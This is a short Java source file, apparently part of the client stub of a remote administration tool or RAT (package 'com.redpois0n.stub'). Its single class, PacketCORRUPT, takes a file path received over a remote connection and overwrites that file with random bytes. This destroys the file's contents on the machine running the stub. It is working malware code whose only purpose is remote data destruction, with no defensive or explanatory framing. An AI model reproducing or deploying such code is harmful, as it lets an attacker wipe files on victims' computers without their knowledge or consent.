package com.redpois0n.stub.packets.incoming;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Random;

import com.redpois0n.Connection;


public class PacketCORRUPT extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		File f = new File(file);
		if (f.exists()) {
			int length = (int) f.length();
			FileOutputStream out = new FileOutputStream(f);
			byte[] b = new byte[1024];
			int done = 0;
			do {
				(new Random()).nextBytes(b);
				out.write(b);
				done += 1024;
			} while (done < length);
			out.close();
		}
	}

}
